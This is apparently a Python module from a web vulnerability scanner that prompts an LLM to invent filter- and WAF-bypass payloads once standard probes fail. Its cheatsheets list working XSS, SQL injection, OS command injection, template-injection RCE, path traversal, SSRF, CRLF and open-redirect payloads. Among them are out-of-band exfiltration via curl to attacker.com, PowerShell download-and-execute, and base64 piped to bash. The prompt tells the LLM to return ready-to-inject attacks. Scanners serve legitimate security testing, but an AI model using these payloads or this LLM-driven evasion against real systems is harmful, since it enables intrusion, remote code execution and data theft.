"""
Adaptive Payload Engine
=======================
After the standard payload set is fired at a field, this engine:

  1. Captures the current page HTML to observe how the application
     filtered / sanitized the input.
  2. Feeds that observation context to an LLM with a detailed bypass prompt.
  3. Streams the LLM's "reasoning" live to the terminal.
  4. Returns creative, context-aware bypass payloads that a human might
     not immediately think of.

The engine reuses the same LLM provider/model configured for the main scan.
"""
from __future__ import annotations

import html as _html_module
import json
import os
import re
import sys
from typing import Optional, TYPE_CHECKING

from rich.console import Console
from rich.rule import Rule

if TYPE_CHECKING:
    from wscan.payload_gen import PayloadGenerator

console = Console()


# ---------------------------------------------------------------------------
# Check-type cheatsheets — advanced techniques per vuln type
# ---------------------------------------------------------------------------

_CHECK_CHEATSHEETS: dict[str, str] = {
    "xss": """
ADVANCED XSS TECHNIQUES (use what the standard set missed):
• Attribute context: close the attribute first → " onmouseover="alert(1)  or ' autofocus onfocus='alert(1)
• JS string context: break the string → '; alert(1); var x='
• Script context (no quotes needed): </script><script>alert(1)</script>
• Tag name alternatives: <details open ontoggle=alert(1)> <marquee onstart=alert(1)> <object data=javascript:alert(1)>
• Encoding bypasses: \\u003cscript\\u003e | \\x3cscript | &lt;script (check if decoded) | base64 in data:
• Case/space: <ScRiPt>alert(1)</sCrIpT> | <img/src=x/onerror=alert(1)>
• SVG: <svg><script>alert&#40;1&#41;</script> | <svg/onload=\\u0061lert(1)>
• XSS via URL: javascript:/*--></title></style></textarea></script><svg onload=alert(1)>
• Template literal: ${alert(1)} ← if inside JS template string
• Mutation XSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
• Polyglot: jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/
""",
    "sqli": """
ADVANCED SQL INJECTION TECHNIQUES:
• UNION column count: ORDER BY 1-- then ORDER BY 2-- until error; then UNION SELECT NULL,NULL...--
• MySQL error: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
• MSSQL error: ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
• PostgreSQL error: ' AND 1=CAST((SELECT version()) AS int)--
• Boolean blind: ' AND SUBSTRING(username,1,1)='a'-- vs 'b' (binary search)
• Time blind MySQL: ' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
• Time blind MSSQL: '; WAITFOR DELAY '0:0:3'--
• Time blind PgSQL: '; SELECT pg_sleep(3)--
• WAF comment bypass: '/**/AND/**/1=1-- | /*!50000UNION*/ /*!50000SELECT*/ NULL--
• WAF case bypass: uNiOn SeLeCt | UnIoN aLl SeLeCt
• WAF URL encode: %27%20OR%201%3D1-- | %55NION (U encoded)
• WAF whitespace bypass: '\\t OR\\t1=1-- | '%0aOR%0a1=1--
• Stacked queries MySQL: '; INSERT INTO users VALUES('hack','hack')--
• Second-order: inject ' into a stored field that is later used in a query
""",
    "os": """
ADVANCED OS COMMAND INJECTION TECHNIQUES:
• Separator variety: ; | & && || \\n %0a %3b (URL encoded)
• Subshell: $(id) `id` $(curl attacker.com/$(id))
• Blind OOB: ; curl http://attacker.com/$(id|base64) | nslookup $(id).attacker.com
• Filter bypass (no spaces): {cat,/etc/passwd} | IFS=,;cmd=cat,/etc/passwd;$cmd
• Filter bypass (no slash): echo${IFS}bHM=|base64${IFS}-d|bash
• Filter bypass (backtick): echo `id`
• Windows CMD: & whoami | type C:\\windows\\win.ini | set | dir C:\\
• Windows PowerShell: ;powershell -enc <base64> | ;powershell IEX(New-Object Net.WebClient).downloadString('http://x/')
• Encoded newline: cmd%0aid | cmd%0a%0did
• Double encoding: %2526id (%25 = %, so %2526 = %26 = &)
• Environment expansion: $PATH $HOME $USER (reveals execution context)
""",
    "ssti": """
ADVANCED SSTI TECHNIQUES:
• Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
• Jinja2 RCE alt: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
• Jinja2 filter bypass: {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}
• Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
• Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
• Velocity: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))
• Smarty: {php}echo `id`;{/php} or {system('id')}
• Mako: ${__import__('os').popen('id').read()}
• Pebble: {%import "java.lang.Runtime"%}{{Runtime.getRuntime().exec("id")}}
• Thymeleaf: __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
""",
    "path_traversal": """
ADVANCED PATH TRAVERSAL TECHNIQUES:
• Classic: ../../../etc/passwd | ..\\..\\..\\windows\\win.ini
• URL encode: ..%2F..%2F..%2Fetc%2Fpasswd
• Double encode: ..%252F..%252Fetc%252Fpasswd
• Unicode: ..%c0%af..%c0%afetc%c0%afpasswd | ..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
• Null byte: ../../../etc/passwd%00 | ../../../etc/passwd%00.jpg
• Absolute: /etc/passwd | C:\\windows\\win.ini | /proc/self/environ
• Dotless: ....// (when ../ is stripped: ....//..//..//etc/passwd)
• Mixed slashes: ..\\/..\\/..\\/ etc (mix backslash and forward)
• Archive path (zip slip): ../../../etc/passwd in ZIP entry filename
• UNC path (Windows): \\\\127.0.0.1\\C$\\windows\\win.ini
• PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd
""",
    "header_injection": """
ADVANCED HEADER INJECTION TECHNIQUES:
• CRLF URL-encoded: %0d%0a | %0D%0A
• LF only: %0a (some servers accept LF without CR)
• Unicode: \\u000d\\u000a | \\r\\n
• Response split: value%0d%0a%0d%0a<html>injected body</html>
• Set-Cookie: value%0d%0aSet-Cookie:session=evil;Path=/
• XSS via Content-Type: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
• Cache poison: value%0d%0aX-Forwarded-Host:evil.com
• Redirect: value%0d%0aLocation:https://evil.com%0d%0a%0d%0a
• Double encoding: %250d%250a (bypass filters that decode once)
""",
    "open_redirect": """
ADVANCED OPEN REDIRECT TECHNIQUES:
• Basic: https://evil.com | //evil.com | ///evil.com
• Protocol-relative: //evil.com/%2F.. | \\\\evil.com
• URL encode slash: https:/%2Fevil.com | https:/\\evil.com
• Double encode: https:%2F%2Fevil.com | %68%74%74%70%73:%2F%2Fevil.com
• @-trick: https://trusted.com@evil.com | https://evil.com%40trusted.com
• Backslash: https:\\\\evil.com | /\\evil.com
• Unicode: https://evil．com (fullwidth dot) | https://ⓔvil.com
• CRLF: %0ahttps://evil.com (header injection leading to redirect)
• Data URI: data:text/html,<script>location='https://evil.com'</script>
• Subpath: https://trusted.com.evil.com | https://trusted-evil.com
""",
    "ssrf": """
ADVANCED SSRF TECHNIQUES:
• Cloud metadata: http://169.254.169.254/ (AWS/Azure) | http://metadata.google.internal/
• Localhost variants: http://127.0.0.1/ | http://localhost/ | http://[::1]/ | http://0/
• Decimal IP: http://2130706433/ (127.0.0.1) | http://0x7f000001/ (hex)
• URL bypass: http://127.1/ | http://127.0.1/ | http://0177.0.0.1/ (octal)
• DNS rebinding: http://r.milburns.net/ (resolves to 127.0.0.1)
• IPv6: http://[::ffff:127.0.0.1]/ | http://[0:0:0:0:0:ffff:127.0.0.1]/
• Scheme abuse: file:///etc/passwd | dict://localhost:6379/ | gopher://localhost:25/
• Internal port scan: http://127.0.0.1:22/ | http://127.0.0.1:3306/ | http://127.0.0.1:6379/
• URL encoding bypass: http://%31%32%37%2e%30%2e%30%2e%31/
• Redirect chain: link to a page that 302-redirects to 169.254.169.254
""",
}


def _get_cheatsheet(check_type: str) -> str:
    return _CHECK_CHEATSHEETS.get(check_type, "")


# ---------------------------------------------------------------------------
# Adaptive prompt template
# ---------------------------------------------------------------------------

_ADAPTIVE_PROMPT = """\
You are a world-class web application penetration tester and CTF champion with deep expertise in \
WAF bypass and advanced injection techniques.

A standard payload scan on the field below produced no confirmed finding. \
Your job: analyse the application's sanitization behavior from the page HTML, \
then craft ADVANCED bypass payloads that the standard set missed.

═══════════════════════════════════════════
TARGET
═══════════════════════════════════════════
URL        : {url}
Field name : {field_name}
Vuln type  : {check_type}

═══════════════════════════════════════════
TECHNIQUE CHEATSHEET — {check_type}
═══════════════════════════════════════════
{cheatsheet}

═══════════════════════════════════════════
WAF / SECURITY LAYER
═══════════════════════════════════════════
{waf_section}

═══════════════════════════════════════════
STANDARD PAYLOADS ALREADY TRIED (no hit):
═══════════════════════════════════════════
{payloads_tried}

═══════════════════════════════════════════
PAGE HTML AFTER LAST PROBE (first 5000 chars):
═══════════════════════════════════════════
{page_excerpt}

═══════════════════════════════════════════
AUTOMATED OBSERVATIONS:
═══════════════════════════════════════════
{observations}

═══════════════════════════════════════════
YOUR TASK
═══════════════════════════════════════════
Step 1 — ANALYSE the page HTML above:
  • Are < > being HTML-entity-encoded (&lt; &gt;)?
  • Are quotes ' " being escaped or removed?
  • Are keywords like script/alert/SELECT/UNION being stripped or blocked?
  • What is the injection context? (HTML body / attribute value / JS string / CSS / JSON)
  • What server-side framework or template engine might be in use?
  • Does any payload fragment appear reflected (partial or encoded)?

Step 2 — GENERATE 8-12 ADVANCED BYPASS payloads that:
  • Are DIFFERENT from all the already-tried payloads
  • Target the SPECIFIC filtering behavior you identified
  • Use techniques from the cheatsheet above
  • Incorporate WAF-specific bypasses if a WAF is listed
  • Are ready to inject verbatim — no placeholders, no pseudo-code

OUTPUT FORMAT — strictly follow this structure:
<analysis>
Write your reasoning here: what filters are active, what injection context you found, \
what strategy you chose. 2-5 sentences.
</analysis>
<payloads>
payload_1_here
payload_2_here
payload_3_here
</payloads>

CRITICAL RULES:
• The <payloads> block must contain ONLY raw payloads — one per line
• NO numbering (1. 2. 3.), NO bullets (- *), NO backticks, NO explanations inside <payloads>
• Each line = one complete, ready-to-inject string
• Max 200 characters per payload
"""


# ---------------------------------------------------------------------------
# Observation builder
# ---------------------------------------------------------------------------

def _build_observations(page_html: str, payloads_tried: list[str]) -> str:
    """
    Analyse the page HTML to infer sanitization behavior.
    Returns a human-readable observations string for the LLM prompt.
    """
    obs: list[str] = []
    sample = page_html[:8000].lower()

    # HTML entity encoding
    if "&lt;" in sample or "&gt;" in sample or "&amp;" in sample:
        obs.append("- HTML entity encoding detected: '<' and '>' are being encoded to &lt; &gt;")
    if "&#x" in sample or "&#" in sample:
        obs.append("- Numeric HTML entity encoding detected (&#xNN; or &#NN;)")

    # Quote escaping
    if "\\'" in page_html[:8000] or '\\"' in page_html[:8000]:
        obs.append("- Quote escaping detected: quotes appear backslash-escaped in the response")
    if "&quot;" in sample or "&#39;" in sample:
        obs.append("- HTML-encoded quotes detected (&quot; or &#39;)")

    # Common keyword stripping
    for kw in ["<script", "onerror", "onclick", "onload", "javascript:", "alert(", "eval("]:
        # Check if the keyword was tried but stripped (not in response)
        for p in payloads_tried[:10]:
            if kw.lower() in p.lower() and kw.lower() not in sample:
                obs.append(f"- Keyword '{kw}' appears to be stripped from output (not reflected)")
                break

    # Reflection check — does anything from our payloads appear in the page?
    reflected: list[str] = []
    for p in payloads_tried[:5]:
        # Check for partial reflection of distinctive fragments
        for fragment in [p[:6], p[:10]]:
            if len(fragment) > 3 and fragment.lower() in sample:
                reflected.append(fragment)
                break
    if reflected:
        obs.append(f"- Partial reflection detected — these fragments appeared in the page: {reflected[:3]}")
    else:
        obs.append("- No clear payload reflection found in the response (application may be blocking silently)")

    # Context detection
    if 'value="' in sample or "value='" in sample:
        obs.append("- Input field 'value' attribute context detected — injection may be inside an HTML attribute")
    if "<script" in sample:
        obs.append("- JavaScript context present in the page — injection into existing JS blocks may be possible")
    if "{{" in page_html[:8000] or "{%" in page_html[:8000]:
        obs.append("- Template delimiters {{ or {% found — template injection may be viable")

    # Error messages
    for err in ["sql", "mysql", "sqlite", "postgresql", "odbc", "ora-", "syntax error",
                "undefined variable", "traceback", "exception"]:
        if err in sample:
            obs.append(f"- Error/stack trace hint detected ('{err}' found in response) — application is leaking debug info")
            break

    if not obs:
        obs.append("- No obvious sanitization artifacts detected in the page HTML")

    return "\n".join(obs)


# ---------------------------------------------------------------------------
# Payload output parser
# ---------------------------------------------------------------------------

def _parse_payload_lines(text: str, already_tried: list[str]) -> list[str]:
    """
    Parse LLM output.
    Prefers <payloads>...</payloads> tag content; falls back to full text.
    Filters out empty lines, prose, and duplicates of already-tried payloads.
    """
    tried_set = set(p.strip() for p in already_tried)

    # Prefer structured tag output
    tag_match = re.search(r"<payloads>(.*?)</payloads>", text, re.DOTALL)
    lines_source = tag_match.group(1) if tag_match else text

    result: list[str] = []
    for line in lines_source.splitlines():
        line = line.strip()
        if not line:
            continue
        # Skip lines that are too long to be a single payload
        if len(line) > 200:
            continue
        # Skip lines that look like numbered list items without payload content
        if re.match(r"^\d+\.\s*$", line):
            continue
        # Skip pure prose lines (only letters and spaces, no injection chars)
        if re.match(r"^[A-Za-z][a-z ]+:?\s*$", line) and len(line) > 20:
            continue
        # Remove leading numbering like "1. " "2) " or bullet "- " "* "
        line = re.sub(r"^[\d]+[\.\)]\s+", "", line)
        line = re.sub(r"^[-*]\s+", "", line)
        if line and line not in tried_set:
            result.append(line)
    return list(dict.fromkeys(result))  # unique, order-preserving


# ---------------------------------------------------------------------------
# Adaptive Payload Engine
# ---------------------------------------------------------------------------

class AdaptivePayloadEngine:
    """
    Observes probe responses and asks the LLM to generate creative bypass payloads.
    Reuses the same LLM provider configured in PayloadGenerator.
    """

    def __init__(self, payload_gen: "PayloadGenerator"):
        self.pg = payload_gen

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    async def generate(
        self,
        check_type: str,
        field_name: str,
        url: str,
        payloads_tried: list[str],
        page_html: str,
        waf_name: Optional[str] = None,
    ) -> list[str]:
        """
        Analyse the page HTML and generate adaptive bypass payloads.
        Returns an empty list if LLM is unavailable.
        """
        if self.pg.provider == "none":
            return []
        if not await self.pg._check_llm_available():
            return []

        cheatsheet = _get_cheatsheet(check_type)
        observations = _build_observations(page_html, payloads_tried)
        payloads_list = "\n".join(f"  {p}" for p in payloads_tried[:30]) or "  (none recorded)"
        page_excerpt = page_html[:5000].replace("```", "'''")

        if waf_name:
            from .waf_detector import _WAF_BYPASSES
            hints = _WAF_BYPASSES.get(waf_name, _WAF_BYPASSES.get("Generic WAF", []))
            hints_text = "\n".join(f"  - {h}" for h in hints)
            waf_section = (
                f"DETECTED WAF: {waf_name}\n"
                f"Known bypass techniques for {waf_name}:\n{hints_text}\n"
                f"You MUST incorporate these evasion strategies into your payloads."
            )
        else:
            waf_section = "No WAF detected — focus on application-level filtering bypasses."

        prompt = _ADAPTIVE_PROMPT.format(
            url=url,
            field_name=field_name,
            check_type=check_type,
            cheatsheet=cheatsheet,
            waf_section=waf_section,
            payloads_tried=payloads_list,
            page_excerpt=page_excerpt,
            observations=observations,
        )

        provider = self.pg.provider
        _adaptive_header(check_type, field_name, provider)

        raw: Optional[str] = None
        if provider == "claude":
            raw = await self._stream_claude(prompt)
        elif provider == "openai":
            raw = await self._stream_openai(prompt)
        elif provider == "gemini":
            raw = await self._call_gemini(prompt)
        else:
            raw = await self._stream_ollama(prompt)

        _adaptive_footer()

        if not raw:
            return []

        payloads = _parse_payload_lines(raw, payloads_tried)
        if payloads:
            console.print(
                f"  [bold magenta][AdaptiveAI][/bold magenta] "
                f"Generated [cyan]{len(payloads)}[/cyan] bypass payload(s) for "
                f"[green]{field_name}[/green] ({check_type})"
            )
        return payloads

    # ------------------------------------------------------------------
    # Streaming backends
    # ------------------------------------------------------------------

    async def _stream_ollama(self, prompt: str) -> Optional[str]:
        import httpx
        full = ""
        try:
            async with httpx.AsyncClient(timeout=90.0) as client:
                async with client.stream(
                    "POST",
                    f"{self.pg.ollama_url}/api/generate",
                    json={
                        "model": self.pg.ollama_model,
                        "prompt": prompt,
                        "stream": True,
                        "options": {"temperature": 0.8, "num_predict": 1000},
                    },
                ) as resp:
                    if resp.status_code != 200:
                        return None
                    async for line in resp.aiter_lines():
                        if not line:
                            continue
                        try:
                            data = json.loads(line)
                            chunk = data.get("response", "")
                            if chunk:
                                sys.stdout.write(chunk)
                                sys.stdout.flush()
                                full += chunk
                            if data.get("done"):
                                break
                        except json.JSONDecodeError:
                            pass
            return full or None
        except Exception as e:
            console.print(f"[yellow][AdaptiveAI] Ollama error: {e}[/yellow]")
            return None

    async def _stream_openai(self, prompt: str) -> Optional[str]:
        api_key = os.environ.get("OPENAI_API_KEY")
        if not api_key:
            return None
        import httpx
        full = ""
        try:
            async with httpx.AsyncClient(timeout=90.0) as client:
                async with client.stream(
                    "POST",
                    "https://api.openai.com/v1/chat/completions",
                    headers={"Authorization": f"Bearer {api_key}"},
                    json={
                        "model": self.pg.openai_model,
                        "messages": [{"role": "user", "content": prompt}],
                        "max_tokens": 1000,
                        "temperature": 0.8,
                        "stream": True,
                    },
                ) as resp:
                    if resp.status_code != 200:
                        console.print(f"[yellow][AdaptiveAI] OpenAI error {resp.status_code}[/yellow]")
                        return None
                    async for line in resp.aiter_lines():
                        if not line or not line.startswith("data:"):
                            continue
                        data_str = line[5:].strip()
                        if data_str == "[DONE]":
                            break
                        try:
                            data = json.loads(data_str)
                            chunk = (
                                data.get("choices", [{}])[0]
                                .get("delta", {})
                                .get("content", "")
                            )
                            if chunk:
                                sys.stdout.write(chunk)
                                sys.stdout.flush()
                                full += chunk
                        except (json.JSONDecodeError, IndexError, KeyError):
                            pass
            return full or None
        except Exception as e:
            console.print(f"[yellow][AdaptiveAI] OpenAI error: {e}[/yellow]")
            return None

    async def _stream_claude(self, prompt: str) -> Optional[str]:
        client = self.pg._get_anthropic_client()
        if not client:
            return None
        import asyncio
        full = ""
        try:
            def _stream_sync():
                nonlocal full
                with client.messages.stream(
                    model="claude-haiku-4-5-20251001",
                    max_tokens=1000,
                    messages=[{"role": "user", "content": prompt}],
                ) as stream:
                    for chunk in stream.text_stream:
                        sys.stdout.write(chunk)
                        sys.stdout.flush()
                        full += chunk
                return full

            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, _stream_sync)
            return full or None
        except Exception as e:
            console.print(f"[yellow][AdaptiveAI] Claude error: {e}[/yellow]")
            return None

    async def _call_gemini(self, prompt: str) -> Optional[str]:
        """Gemini (non-streaming — prints full response after completion)."""
        api_key = os.environ.get("GEMINI_API_KEY")
        if not api_key:
            return None
        import httpx
        try:
            async with httpx.AsyncClient(timeout=60.0) as client:
                url = (
                    f"https://generativelanguage.googleapis.com/v1beta/models/"
                    f"{self.pg.gemini_model}:generateContent?key={api_key}"
                )
                resp = await client.post(
                    url,
                    json={"contents": [{"parts": [{"text": prompt}]}]},
                )
                if resp.status_code == 200:
                    data = resp.json()
                    text = data["candidates"][0]["content"]["parts"][0]["text"]
                    sys.stdout.write(text)
                    sys.stdout.flush()
                    return text
                console.print(f"[yellow][AdaptiveAI] Gemini error {resp.status_code}[/yellow]")
        except Exception as e:
            console.print(f"[yellow][AdaptiveAI] Gemini error: {e}[/yellow]")
        return None


# ---------------------------------------------------------------------------
# Visual helpers
# ---------------------------------------------------------------------------

def _adaptive_header(check_type: str, field_name: str, provider: str) -> None:
    console.print()
    console.print(Rule(
        f"[bold magenta] 🧠 AdaptiveAI — {check_type.upper()} bypass for '{field_name}' "
        f"({provider}) ",
        style="magenta",
    ))
    console.print()


def _adaptive_footer() -> None:
    console.print()
    console.print(Rule(style="magenta"))
    console.print()
